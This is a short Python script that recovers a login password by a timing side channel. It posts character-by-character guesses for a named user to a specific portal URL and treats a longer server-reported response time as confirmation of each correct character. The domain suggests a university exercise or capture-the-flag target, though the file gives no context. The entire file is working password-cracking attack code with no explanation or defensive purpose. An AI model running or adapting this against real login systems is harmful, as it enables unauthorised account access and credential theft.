import requests


def try_password(password_guess, i):
    username = 'jonas.dahl'
    url = 'https://portal.regjeringen.uiaikt.no/login'
    data = {'username': username, 'password': password_guess}
    response = requests.post(url, json=data)
    json = response.json()
    # Get the total time response from the server
    total_time = json['total_time']
    # If the total time is greater than i + 1, then the current character is correct
    if total_time > i + 1:
        return True
    else:
        return False


def find_password():
    # Password length is known to be based on manual testing 17
    password = 'aaaaaaaaaaaaaaaaa'
    characters = 'abcdefghijklmnopqrstuvwxyzæøåABCDEFGHIJKLMNOPQRSTUVWXYZÆØÅ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
    final_password = ''

    # i is in this function used to keep track of the index of the character we are trying to guess
    i = 0
    while True:
        for char in characters:
            # Replace the character at index i with the current character we are trying
            password = password[:i] + char + password[i+1:]
            # If try_password returns true, the character is added to the final password,
            # and we move on to the next character
            if try_password(password, i):
                final_password += char
                print(final_password)
                break

        i += 1


find_password()